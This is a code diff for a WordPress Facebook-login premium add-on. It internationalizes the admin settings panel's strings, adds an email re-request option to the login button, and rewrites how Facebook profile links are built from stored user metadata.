+		<b><?php _e('Autoregistered User Role', 'wp-fb-ac')?>:</b><br />
 		<?php
 		add_option($opt_jfbp_autoregistered_role, get_option('default_role'));
 		$currSelection = get_option($opt_jfbp_autoregistered_role);
 		$editable_roles = get_editable_roles();
 		if ( empty( $editable_roles[$currSelection] ) ) $currSelection = get_option('default_role');
 		?>
-		Users who are autoregistered with Facebook will be created with the role: 
+		<?php _e('Users who are autoregistered with Facebook will be created with the role:', 'wp-fb-ac')?> 
 		<select <?php disableatt() ?> name="<?php echo $opt_jfbp_autoregistered_role?>" id="<?php echo $opt_jfbp_autoregistered_role?>">
 			<?php wp_dropdown_roles( $currSelection ); ?>
 		</select><br /><br />
 
-        <b>Widget Appearance:</b><br />
-        Please use the <a href="<?php echo admin_url('widgets.php') ?>" target="widgets">WP-FB AutoConnect <b><i>Premium</i></b> Widget</a> if you'd like to:<br />
-        &bull; Customize the Widget's text <?php jfb_output_simple_lightbox("(Click for more info)", "You can customize the text of: User, Pass, Login, Remember, Forgot, Logout, Edit Profile, Welcome.")?><br />
-        &bull; Show/Hide any of the Widget's links, checkboxes, or textfields  <?php jfb_output_simple_lightbox("(Click for more info)", "You can show or hide:<ul style='list-style-type:disc;list-style-position:inside;'><li>The User/Pass fields (leaving Facebook as the only way to login)</li><li>The 'Register' link (only applicable if registration is enabled on the site/network)</li><li>The 'Remember' tickbox</li><li>The 'Edit Profile' link</li><li>The 'Forgot Password' link</li></ul>")?><br />      
-        &bull; Show the user's avatar next to their username (when logged in)<br />
-		&bull; Point the "Edit Profile" link to the BP profile, rather than WP<br/>
-		&bull; Point the "Forgot Password" link to a custom URL of your choosing<br />
-        &bull; Allow the user to simultaneously logout of your site <i>and</i> Facebook<br /><br />
+        <b><?php _e('Widget Appearance', 'wp-fb-ac')?>:</b><br />
+        <?php echo sprintf(__("Please use the %s if you'd like to:", 'wp-fb-ac'), "<a href='".admin_url('widgets.php')."' target='widgets'>WP-FB AutoConnect <b><i>Premium</i></b> Widget</a>"); ?><br />
+        &bull; <?php _e("Customize the Widget's text", 'wp-fb-ac')?> <?php jfb_output_simple_lightbox("", __("You can customize the text of: User, Pass, Login, Remember, Forgot, Logout, Edit Profile, Welcome.", 'wp-fb-ac'))?><br />
+        &bull; <?php _e("Show/Hide any of the Widget's links, checkboxes, or textfields", 'wp-fb-ac')?> <?php jfb_output_simple_lightbox("", __("You can show or hide:", 'wp-fb-ac') . "<ul style='list-style-type:disc;list-style-position:inside;'><li>".__('The User/Pass fields (leaving Facebook as the only way to login)', 'wp-fb-ac')."</li><li>".__("The 'Register' link (only applicable if registration is enabled on the site/network)", 'wp-fb-ac')."</li><li>".__("The 'Remember' tickbox", 'wp-fb-ac')."</li><li>".__("The 'Edit Profile' link", 'wp-fb-ac')."</li><li>".__("The 'Forgot Password' link",'wp-fb-ac')."</li></ul>")?><br />      
+        &bull; <?php _e("Show the user's avatar next to their username (when logged in)", 'wp-fb-ac')?><br />
+		&bull; <?php _e("Point the 'Edit Profile' link to the BP profile, rather than WP", 'wp-fb-ac')?><br/>
+		&bull; <?php _e("Point the 'Forgot Password' link to a custom URL of your choosing", 'wp-fb-ac')?><br />
+        &bull; <?php _e("Allow the user to simultaneously logout of your site *and* Facebook", 'wp-fb-ac')?><br /><br />
             
-        <b>AJAX Spinner:</b><br />
-        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_show_spinner; ?>" value="0" <?php echo (get_option($opt_jfbp_show_spinner)==0?"checked='checked'":"")?> >Don't show an AJAX spinner<br />
-        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_show_spinner; ?>" value="1" <?php echo (get_option($opt_jfbp_show_spinner)==1?"checked='checked'":"")?> >Show a white AJAX spinner to indicate the login process has started (<img src=" <?php echo $jfb_data_url ?>/assets/spinner_white.gif" alt="spinner" />)<br />
-        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_show_spinner; ?>" value="2" <?php echo (get_option($opt_jfbp_show_spinner)==2?"checked='checked'":"")?> >Show a black AJAX spinner to indicate the login process has started (<img src=" <?php echo $jfb_data_url ?>/assets/spinner_black.gif" alt="spinner" />)<br /><br />
+        <b><?php _e('AJAX Spinner', 'wp-fb-ac')?>:</b><br />
+        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_show_spinner; ?>" value="0" <?php echo (get_option($opt_jfbp_show_spinner)==0?"checked='checked'":"")?> ><?php _e("Don't show an AJAX spinner", 'wp-fb-ac')?><br />
+        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_show_spinner; ?>" value="1" <?php echo (get_option($opt_jfbp_show_spinner)==1?"checked='checked'":"")?> ><?php _e('Show a white AJAX spinner to indicate the login process has started', 'wp-fb-ac')?> (<img src=" <?php echo $jfb_data_url ?>/assets/spinner_white.gif" alt="spinner" />)<br />
+        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_show_spinner; ?>" value="2" <?php echo (get_option($opt_jfbp_show_spinner)==2?"checked='checked'":"")?> ><?php _e('Show a black AJAX spinner to indicate the login process has started', 'wp-fb-ac')?> (<img src=" <?php echo $jfb_data_url ?>/assets/spinner_black.gif" alt="spinner" />)<br /><br />
                 
-        <b>AutoRegistration Restrictions:</b><br />
+        <b><?php _e('AutoRegistration Restrictions', 'wp-fb-ac')?>:</b><br />
         <?php add_option($opt_jfbp_restrict_reg_url, '/') ?>
-        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="0" <?php echo (get_option($opt_jfbp_restrict_reg)==0?"checked='checked'":"")?>>Open: Anyone can login (Default)<br />
-        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="1" <?php echo (get_option($opt_jfbp_restrict_reg)==1?"checked='checked'":"")?>>Closed: Only login existing blog users<br />
-        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="2" <?php echo (get_option($opt_jfbp_restrict_reg)==2?"checked='checked'":"")?>>Invitational: Only login users who've been invited via the <a href="http://wordpress.org/extend/plugins/wordpress-mu-secure-invites/">Secure Invites</a> plugin <?php jfb_output_simple_lightbox("(Click for more info)", "For invites to work, the connecting user's Facebook email must be accessible, and it must match the email to which the invitation was sent.")?><br />
-		<input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="3" <?php echo (get_option($opt_jfbp_restrict_reg)==3?"checked='checked'":"")?>>Friendship: Only login users who are friends with uid <input <?php disableatt() ?> type="text" size="15" name="<?php echo $opt_jfbp_restrict_reg_uid?>" value="<?php echo get_option($opt_jfbp_restrict_reg_uid) ?>" /> on Facebook <?php jfb_output_simple_lightbox("(Click for more info)", "To find your Facebook uid, login and view your Profile Pictures album.  The URL will be something like 'http://www.facebook.com/media/set/?set=a.123.456.789'.  In this example, your uid would be 789 (the numbers after the last decimal point).")?><br />
-		<input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="4" <?php echo (get_option($opt_jfbp_restrict_reg)==4?"checked='checked'":"")?>>Membership: Only login users who are members of group id <input <?php disableatt() ?> type="text" size="15" name="<?php echo $opt_jfbp_restrict_reg_gid?>" value="<?php echo get_option($opt_jfbp_restrict_reg_gid); ?>" /> on Facebook <?php jfb_output_simple_lightbox("(Click for more info)", "To find a groups's id, view its URL.  It will be something like 'http://www.facebook.com/group.php?gid=12345678'.  In this example, the group id would be 12345678.")?><br />
-		<input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="5" <?php echo (get_option($opt_jfbp_restrict_reg)==5?"checked='checked'":"")?>>Fanpage: Only login users who are fans of page id <input <?php disableatt() ?> type="text" size="15" name="<?php echo $opt_jfbp_restrict_reg_pid?>" value="<?php echo get_option($opt_jfbp_restrict_reg_pid); ?>" /> on Facebook <?php jfb_output_simple_lightbox("(Click for more info)", "To find a page's id, view one of its photo albums.  The URL will be something like 'http://www.facebook.com/media/set/?set=a.123.456.789'.  In this example, the id would be 789 (the numbers after the last decimal point).")?><br />
-        Redirect URL for denied logins: <input <?php disableatt() ?> type="text" size="30" name="<?php echo $opt_jfbp_restrict_reg_url?>" value="<?php echo get_option($opt_jfbp_restrict_reg_url) ?>" /><br /><br />
+        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="0" <?php echo (get_option($opt_jfbp_restrict_reg)==0?"checked='checked'":"")?>><?php _e('Open - Anyone can login (Default)', 'wp-fb-ac')?><br />
+        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="1" <?php echo (get_option($opt_jfbp_restrict_reg)==1?"checked='checked'":"")?>><?php _e('Closed - Only login existing blog users', 'wp-fb-ac')?><br />
+        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="2" <?php echo (get_option($opt_jfbp_restrict_reg)==2?"checked='checked'":"")?>><?php echo sprintf(__("Invitational - Only autoregister users who've been invited via the %s plugin", 'wp-fb-ac'), '<a target="secureinvites" href="http://wordpress.org/extend/plugins/wordpress-mu-secure-invites/">Secure Invites</a>')?> <?php jfb_output_simple_lightbox("", __("For invites to work, the connecting user's Facebook email must be accessible, and it must match the email to which the invitation was sent.", 'wp-fb-ac'))?><br />
+		<input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="3" <?php echo (get_option($opt_jfbp_restrict_reg)==3?"checked='checked'":"")?>><?php _e('Friendship - Only autoregister friends of Facebook user id:', 'wp-fb-ac')?> <input <?php disableatt() ?> type="text" size="15" name="<?php echo $opt_jfbp_restrict_reg_uid?>" value="<?php echo get_option($opt_jfbp_restrict_reg_uid) ?>" /> <?php jfb_output_simple_lightbox("", sprintf(__("To find your Facebook uid, login and view your Profile Pictures album.  The URL will be something like '%s'.  In this example, your uid would be 789 (the numbers after the last decimal point).",'wp-fb-ac'), "http://www.facebook.com/media/set/?set=a.123.456.789"))?><br />
+		<input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="4" <?php echo (get_option($opt_jfbp_restrict_reg)==4?"checked='checked'":"")?>><?php _e('Membership - Only autoregister members of Facebook group id:', 'wp-fb-ac')?> <input <?php disableatt() ?> type="text" size="15" name="<?php echo $opt_jfbp_restrict_reg_gid?>" value="<?php echo get_option($opt_jfbp_restrict_reg_gid); ?>" /> <?php jfb_output_simple_lightbox("", sprintf(__("To find a group's id, view its URL.  If it's something like '%s', the id would be 12345678.  If it uses a vanity URL (like %s) and is public, you can use %s to find its id.  If the group is both private/secret AND it uses a vanity URL, you'll have to use Facebook's Graph Explorer tool to lookup the id.  Visit %s, then click 'Submit.'  Assuming you're a member of the group, you should see it listed in the result, along with its id.", 'wp-fb-ac'), "www.facebook.com/groups/12345678/", "www.facebook.com/groups/MyGroupName/", "<a href='http://lookup-id.com' target='vanity'>lookup-id.com</a>", "<a href='https://developers.facebook.com/tools/explorer/?method=GET&path=me%3Ffields%3Dgroups' target='explorer'>here</a>") . "<br/><br/>" . __("In order to use this option, you'll need to submit your app for review by Facebook.  Please see FAQ#56 for more info:", 'wp-fb-ac') . " <a href='$jfb_homepage#faq56' target='extendedfaq'>here</a>")?><br />
+		<input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="5" <?php echo (get_option($opt_jfbp_restrict_reg)==5?"checked='checked'":"")?>><?php _e('Fanpage - Only autoregister fans of Facebook page id:', 'wp-fb-ac')?> <input <?php disableatt() ?> type="text" size="15" name="<?php echo $opt_jfbp_restrict_reg_pid?>" value="<?php echo get_option($opt_jfbp_restrict_reg_pid); ?>" /> <?php jfb_output_simple_lightbox("", sprintf(__("To find a page's id, view one of its photo albums.  The URL will be something like '%s'.  In this example, the id would be 789 (the numbers after the last decimal point).", 'wp-fb-ac'),"http://www.facebook.com/media/set/?set=a.123.456.789") . "<br/><br/>" . __("In order to use this option, you'll need to submit your app for review by Facebook.  Please see FAQ#56 for more info:", 'wp-fb-ac') . " <a href='$jfb_homepage#faq56' target='extendedfaq'>here</a>")?><br />
+        <?php _e('Redirect URL for denied logins:', 'wp-fb-ac')?> <input <?php disableatt() ?> type="text" size="30" name="<?php echo $opt_jfbp_restrict_reg_url?>" value="<?php echo get_option($opt_jfbp_restrict_reg_url) ?>" /><br /><br />
                 
-        <b>Custom Redirects:</b><br />
+        <b><?php _e('Custom Redirects', 'wp-fb-ac')?>:</b><br />
         <?php add_option($opt_jfbp_redirect_new, "1"); ?>
         <?php add_option($opt_jfbp_redirect_existing, "1"); ?>
         <?php add_option($opt_jfbp_redirect_logout, "1"); ?>
-        When a new user is autoregistered on your site, redirect them to:<br />
-        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_new; ?>" value="1" <?php echo (get_option($opt_jfbp_redirect_new)==1?"checked='checked'":"")?> >Default (refresh current page)<br />
-        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_new; ?>" value="2" <?php echo (get_option($opt_jfbp_redirect_new)==2?"checked='checked'":"")?> >Custom URL:
-        <input <?php disableatt() ?> type="text" size="47" name="<?php echo $opt_jfbp_redirect_new_custom?>" value="<?php echo get_option($opt_jfbp_redirect_new_custom) ?>" /> <small>(Supports %username% variables)</small><br /><br />
-        When an existing user returns to your site, redirect them to:<br />
-        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_existing; ?>" value="1" <?php echo (get_option($opt_jfbp_redirect_existing)==1?"checked='checked'":"")?> >Default (refresh current page)<br />
-        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_existing; ?>" value="2" <?php echo (get_option($opt_jfbp_redirect_existing)==2?"checked='checked'":"")?> >Custom URL:
-        <input <?php disableatt() ?> type="text" size="47" name="<?php echo $opt_jfbp_redirect_existing_custom?>" value="<?php echo get_option($opt_jfbp_redirect_existing_custom) ?>" /> <small>(Supports %username% variables)</small><br /><br />
-        When a user logs out of your site, redirect them to:<br />
-        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_logout; ?>" value="1" <?php echo (get_option($opt_jfbp_redirect_logout)==1?"checked='checked'":"")?> >Default (refresh current page)<br />
-        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_logout; ?>" value="2" <?php echo (get_option($opt_jfbp_redirect_logout)==2?"checked='checked'":"")?> >Custom URL:
+        <?php _e('When a new user is autoregistered on your site, redirect them to:', 'wp-fb-ac')?><br />
+        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_new; ?>" value="1" <?php echo (get_option($opt_jfbp_redirect_new)==1?"checked='checked'":"")?> ><?php _e('Default (refresh current page)', 'wp-fb-ac')?><br />
+        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_new; ?>" value="2" <?php echo (get_option($opt_jfbp_redirect_new)==2?"checked='checked'":"")?> ><?php _e('Custom URL', 'wp-fb-ac')?>:
+        <input <?php disableatt() ?> type="text" size="47" name="<?php echo $opt_jfbp_redirect_new_custom?>" value="<?php echo get_option($opt_jfbp_redirect_new_custom) ?>" /> <small>(<?php echo sprintf(__('Supports %s variables', 'wp-fb-ac'), "%username%")?>)</small><br /><br />
+        <?php _e('When an existing user returns to your site, redirect them to:', 'wp-fb-ac')?><br />
+        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_existing; ?>" value="1" <?php echo (get_option($opt_jfbp_redirect_existing)==1?"checked='checked'":"")?> ><?php _e('Default (refresh current page)', 'wp-fb-ac')?><br />
+        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_existing; ?>" value="2" <?php echo (get_option($opt_jfbp_redirect_existing)==2?"checked='checked'":"")?> ><?php _e('Custom URL', 'wp-fb-ac')?>:
+        <input <?php disableatt() ?> type="text" size="47" name="<?php echo $opt_jfbp_redirect_existing_custom?>" value="<?php echo get_option($opt_jfbp_redirect_existing_custom) ?>" /> <small>(<?php echo sprintf(__('Supports %s variables', 'wp-fb-ac'), "%username%") ?>)</small><br /><br />
+        <?php _e('When a user logs out of your site, redirect them to:', 'wp-fb-ac')?><br />
+        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_logout; ?>" value="1" <?php echo (get_option($opt_jfbp_redirect_logout)==1?"checked='checked'":"")?> ><?php _e('Default (refresh current page)', 'wp-fb-ac')?><br />
+        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_logout; ?>" value="2" <?php echo (get_option($opt_jfbp_redirect_logout)==2?"checked='checked'":"")?> ><?php _e('Custom URL', 'wp-fb-ac')?>:
         <input <?php disableatt() ?> type="text" size="47" name="<?php echo $opt_jfbp_redirect_logout_custom?>" value="<?php echo get_option($opt_jfbp_redirect_logout_custom) ?>" /><br /><br />
 
-        <b>Welcome Message:</b><br />
+        <b><?php _e('Welcome Message', 'wp-fb-ac')?>:</b><br />
         <?php add_option($opt_jfbp_notifyusers_content, "Thank you for logging into " . get_option('blogname') . " with Facebook.\nIf you would like to login manually, you may do so with the following credentials.\n\nUsername: %username%\nPassword: %password%"); ?>
         <?php add_option($opt_jfbp_notifyusers_subject, "Welcome to " . get_option('blogname')); ?>
-        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_notifyusers?>" value="1" <?php echo get_option($opt_jfbp_notifyusers)?'checked="checked"':''?> /> Send a custom welcome e-mail to users who register via Facebook <small>(*If we know their address)</small><br />
+        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_notifyusers?>" value="1" <?php echo get_option($opt_jfbp_notifyusers)?'checked="checked"':''?> /> <?php _e('Send a custom welcome e-mail to users who register via Facebook', 'wp-fb-ac')?> <small>(*<?php _e('If we know their address', 'wp-fb-ac')?>)</small><br />
         <input <?php disableatt() ?> type="text" size="102" name="<?php echo $opt_jfbp_notifyusers_subject?>" value="<?php echo get_option($opt_jfbp_notifyusers_subject) ?>" /><br />
         <textarea <?php disableatt() ?> cols="85" rows="5" name="<?php echo $opt_jfbp_notifyusers_content?>"><?php echo get_option($opt_jfbp_notifyusers_content) ?></textarea><br /><br />
 
-        <b>BuddyPress Activity Stream:</b><br />
-        <?php add_option($opt_jfbp_bpstream_logincontent, "%user% logged in with Facebook"); ?>
-        <?php add_option($opt_jfbp_bpstream_registercontent, "%user% registered with Facebook"); ?>
-        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_bpstream_register?>" value="1" <?php echo get_option($opt_jfbp_bpstream_register)?'checked="checked"':''?> /> When a new user autoconnects to your site, post to the BP Activity Stream:
+        <b><?php _e('BuddyPress Activity Stream', 'wp-fb-ac')?>:</b><br />
+        <?php add_option($opt_jfbp_bpstream_logincontent, sprintf(__("%s logged in with Facebook", 'wp-fb-ac'), "%user%")); ?>
+        <?php add_option($opt_jfbp_bpstream_registercontent, sprintf(__("%s registered with Facebook", 'wp-fb-ac'), "%user%")); ?>
+        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_bpstream_register?>" value="1" <?php echo get_option($opt_jfbp_bpstream_register)?'checked="checked"':''?> /> <?php _e('When a new user autoconnects to your site, post to the BP Activity Stream:', 'wp-fb-ac')?>
         <input <?php disableatt() ?> type="text" size="50" name="<?php echo $opt_jfbp_bpstream_registercontent?>" value="<?php echo get_option($opt_jfbp_bpstream_registercontent) ?>" /><br />
-		<input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_bpstream_login?>" value="1" <?php echo get_option($opt_jfbp_bpstream_login)?'checked="checked"':''?> /> When an existing user returns to your site, post to the BP Activity Stream:
+		<input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_bpstream_login?>" value="1" <?php echo get_option($opt_jfbp_bpstream_login)?'checked="checked"':''?> /> <?php _e('When an existing user returns to your site, post to the BP Activity Stream:', 'wp-fb-ac')?>
         <input <?php disableatt() ?> type="text" size="50" name="<?php echo $opt_jfbp_bpstream_logincontent?>" value="<?php echo get_option($opt_jfbp_bpstream_logincontent) ?>" /><br /><br />
  
-		<b>BuddyPress X-Profile Mappings</b><br />
-		This section will let you automatically fill in your Buddypress users' X-Profile data from their Facebook profiles.<br />
-		<small>&bull; Facebook fields marked with an asterisk (i.e. Birthday*) require the user to approve extra permissions during login.</small><br />
-		<small>&bull; Some limitations exist regarding which X-Profile fields can be populated</small> <?php jfb_output_simple_lightbox("(Click for more info)", "Only 'Text Box,' 'Multi-Line Text Box,' and 'Date Selector'-type profile fields can be mapped at this time.  Due to unpredictability in matching freeform values from Facebook to pre-defined values on BuddyPress, support for dropdowns, radiobuttons, and checkboxes MAY be added in the future.")?><br />
-		<small>&bull; Some limitations exist regarding which Facebook fields can be imported</small> <?php jfb_output_simple_lightbox("(Click for more info)", "Because some Facebook fields are formatted differently, each one needs to be explicitly implemented.  I've included an initial selection of fields (i.e. Name, Gender, Birthday, Bio, etc), but if you need another field to be available, please request it on the support page and I'll do my best to add it to the next update.")?><br /><br />
-		
+		<b><?php _e('BuddyPress X-Profile Mappings', 'wp-fb-ac')?>:</b><br />
+		<?php _e("This section will let you automatically fill in your Buddypress users' X-Profile data from their Facebook profiles.", 'wp-fb-ac')?><br />
+		<small>&bull; <?php _e('Some limitations exist regarding which X-Profile fields can be populated', 'wp-fb-ac')?></small> <?php jfb_output_simple_lightbox("", __("Only 'Text Box,' 'Multi-Line Text Box,' and 'Date Selector'-type profile fields can be mapped at this time.  Due to unpredictability in matching freeform values from Facebook to pre-defined values on BuddyPress, support for dropdowns, radiobuttons, and checkboxes MAY be added in the future.", 'wp-fb-ac'))?><br />
+		<small>&bull; <?php _e('Some limitations exist regarding which Facebook fields can be imported', 'wp-fb-ac')?></small> <?php jfb_output_simple_lightbox("", __("Because some Facebook fields are formatted differently, each one needs to be explicitly implemented.  I've included an initial selection of fields (i.e. Name, Gender, Birthday, Bio, etc), but if you need another field to be available, please request it on the support page and I'll do my best to add it to the next update.", 'wp-fb-ac'))?><br />
+		<small>&bull; <?php _e("In order to import fields marked with an asterisk (i.e. Birthday*), you'll need to submit your app for review by Facebook.  Please see FAQ#56 for more info:", 'wp-fb-ac'); echo " <a href='$jfb_homepage#faq56' target='extendedfaq'>here</a>"; ?></small><br/><br/>
+        		
          <?php
          //If people report problems with Buddypress detection, use this more robust method: http://codex.buddypress.org/plugin-development/checking-buddypress-is-active/
-         if( !function_exists('bp_has_profile') ) echo "<i>BuddyPress Not Found.  This section is only available on BuddyPress-enabled sites.</i>";
-         else if ( !bp_has_profile() )            echo "Error: BuddyPress Profile Not Found.  This should never happen - if you see this message, please report it on the plugin support page.";
+         if( !function_exists('bp_has_profile') ) echo "<i>".__("BuddyPress Not Found.  This section is only available on BuddyPress-enabled sites.",'wp-fb-ac')."</i>";
+         else if ( !bp_has_profile() )            echo __("Error: BuddyPress Profile Not Found.  This should never happen - if you see this message, please report it on the plugin support page.", 'wp-fb-ac');
          else
          {
             //Present the 3 mapping options: disable mapping, map new users, or map new and returning users ?> 
-            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_xprofile_map; ?>" value="0" <?php echo (get_option($opt_jfbp_xprofile_map)==0?"checked='checked'":"")?> >Disable Mapping
-            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_xprofile_map; ?>" value="1" <?php echo (get_option($opt_jfbp_xprofile_map)==1?"checked='checked'":"")?> >Map New Users Only
-            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_xprofile_map; ?>" value="2" <?php echo (get_option($opt_jfbp_xprofile_map)==2?"checked='checked'":"")?> >Map New And Returning Users<br /><?php
+            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_xprofile_map; ?>" value="0" <?php echo (get_option($opt_jfbp_xprofile_map)==0?"checked='checked'":"")?> ><?php _e('Disable Mapping', 'wp-fb-ac')?>
+            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_xprofile_map; ?>" value="1" <?php echo (get_option($opt_jfbp_xprofile_map)==1?"checked='checked'":"")?> ><?php _e('Map New Users Only', 'wp-fb-ac')?>
+            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_xprofile_map; ?>" value="2" <?php echo (get_option($opt_jfbp_xprofile_map)==2?"checked='checked'":"")?> ><?php _e('Map New And Returning Users', 'wp-fb-ac')?><br /><?php
             
             //Make a list of which Facebook fields may be mapped to each type of xProfile field.  Omitted types (i.e. checkbox) are treated as "unmappable."
             //The format is "xprofile_field_type"->"(fbfieldname1, fbfieldDisplayname1), (fbfieldname2, fbfieldDisplayname2), ..."
@@ -500,14 +555,14 @@ function jfb_output_premium_panel()
                     //If there aren't any available Facebook mappings, just put a disabled textbox and "hidden" field that sets this option as '0' 
                     if( !$allowed_mappings[$field->type] )
                     {
-                        echo "<input disabled='disabled' type='text' size='30' name='$field->name"."_unavail"."' value='(No Mappings Available)' />";
+                        echo "<input disabled='disabled' type='text' size='30' name='$field->name"."_unavail"."' value='(".__("No Mappings Available", 'wp-fb-ac').")' />";
                         echo "<input type='hidden' name='$field->id' value='0' />";
                         continue;
                     }
                     
                     //Otherwise, list all of the available mappings in a dropdown.
                     ?><select name="<?php echo $jfb_xprofile_field_prefix . $field->id?>">
-                    	<option value="0">(No Mapping)</option><?php
+                    	<option value="0">(<?php _e('No Mapping', 'wp-fb-ac')?>)</option><?php
                         foreach($allowed_mappings[$field->type] as $fbname => $userfriendlyname)
                             echo "<option " . ($current_mappings[$field->id]==$fbname?"selected":"") . " value=\"$fbname\">$userfriendlyname</option>";
     			    ?></select><br /><?php
@@ -517,7 +572,7 @@ function jfb_output_premium_panel()
         }?>
                                         
         <input type="hidden" name="prem_opts_updated" value="1" />
-        <div class="submit"><input <?php disableatt() ?> type="submit" name="Submit" value="Save Premium" /></div>
+        <div class="submit"><input <?php disableatt() ?> type="submit" name="Submit" value="<?php _e('Save Premium', 'wp-fb-ac')?>" /></div>
     </form>
     <?php    
 }
@@ -538,34 +593,37 @@ function jfb_p_fbid_column($column_headers) {
 function jfb_p_fbid_custom_column($custom_column,$column_name,$user_id)
 {
     if ($column_name=='fbid') 
-    {
-        $uid = get_user_meta($user_id, "facebook_uid", true);
-        if($uid)
-            $custom_column = "<a href='http://www.facebook.com/profile.php?id=$uid' target='fb'>$uid</a>";
-    }
+		$custom_column = jfb_get_fb_profilelink($user_id);
     return $custom_column;
 }
 
 
-/**********************************************************************/
-/**********************************************************************/
-/**********************VERSION CHECK/LOGGING***************************/
-/**********************************************************************/
-/**********************************************************************/
-
-//Add a warning message to the admin panel if using an out-of-date core plugin version 
-add_action('wpfb_admin_messages', 'jfb_check_premium_version');
-function jfb_check_premium_version()
+//Because FB API 2.0 started returning scoped userIDs instead of real userIDs, the profile link can no longer be
+//inferred from the ID alone.  Thus plugin v4.0.0+ started storing the profile link explicitly in usermeta.
+//For newer users who have this usermeta, output a link; for older ones, output the "real" userID and our constructed profile.php-style link.
+function jfb_get_fb_profilelink($wp_uid)
 {
-    global $jfb_version;
-    if( version_compare($jfb_version, JFB_PREMIUM_REQUIREDVER) == -1 ): ?>
-    <div class="error"><p><strong>Warning:</strong> The Premium addon requires WP-FB-AutoConnect <?php echo JFB_PREMIUM_REQUIREDVER ?> or newer to make use of all available features.  Please update your core plugin.</p></div>
-    <?php endif;
+	global $jfb_uid_meta_name, $jfb_url_meta_name;
+	$uid = get_user_meta($wp_uid, $jfb_uid_meta_name, true);
+	$url = get_user_meta($wp_uid, $jfb_url_meta_name, true);
+	
+	if($uid && $url)
+		return "<a href='$url' target='fb'>" . __('Visit Profile', 'wp-fb-ac')."</a>";
+	else if($uid)
+    	return "<a href='http://www.facebook.com/profile.php?id=$uid' target='fb'>ID $uid</a>";
+	else
+		return "";
 }
 
 
+/**********************************************************************/
+/**********************************************************************/
+/******************************LOGGING*********************************/
+/**********************************************************************/
+/**********************************************************************/
+
+
 //Add a note to login logs that we're using the premium addon
-add_action('wpfb_prelogin', 'jfb_log_premium');
 function jfb_log_premium()
 {
     global $jfb_log;
@@ -573,7 +631,6 @@ function jfb_log_premium()
 }
 
 //Add an HTML comment that we're using the premium addon
-add_action('wpfb_after_button', 'jfb_report_premium_version');
 function jfb_report_premium_version()
 {
     echo "<!--Premium Add-On #" . JFB_PREMIUM . ", version " . JFB_PREMIUM_VER . "-->\n"; 
@@ -916,7 +973,7 @@ function jfb_bpregistration_button()
  */ 
 function jfb_output_facebook_btn_premium_30($scope)
 {
-    global $opt_jfbp_buttonstyle, $opt_jfbp_buttonimg, $jfb_js_callbackfunc, $opt_jfbp_buttonsize, $opt_jfbp_buttontext;
+    global $opt_jfbp_buttonstyle, $opt_jfbp_buttonimg, $jfb_js_callbackfunc, $opt_jfbp_buttonsize, $opt_jfbp_buttontext, $opt_jfbp_requirerealmail;
     
     //Original-style (xfbml) buttons
     if(get_option($opt_jfbp_buttonstyle) == 0)
@@ -927,6 +984,9 @@ function jfb_output_facebook_btn_premium_30($scope)
         else if( get_option($opt_jfbp_buttonsize) == 3 )$attr = 'v="2" size="medium"';
         else if( get_option($opt_jfbp_buttonsize) == 4 )$attr = 'v="2" size="large"';
         else if( get_option($opt_jfbp_buttonsize) == 5 )$attr = 'v="2" size="xlarge"';
+		
+		//For the "enforce access to e-mail" option
+		if(get_option($opt_jfbp_requirerealmail)) $attr .= ' auth_type="rerequest"';
         
         ?><span class="fbLoginButton"><script type="text/javascript">//<!--
             document.write('<fb:login-button scope="<?php echo $scope;?>" <?php echo $attr;?> onlogin="<?php echo $jfb_js_callbackfunc;?>();"><?php echo get_option($opt_jfbp_buttontext);?></fb:login-button>');
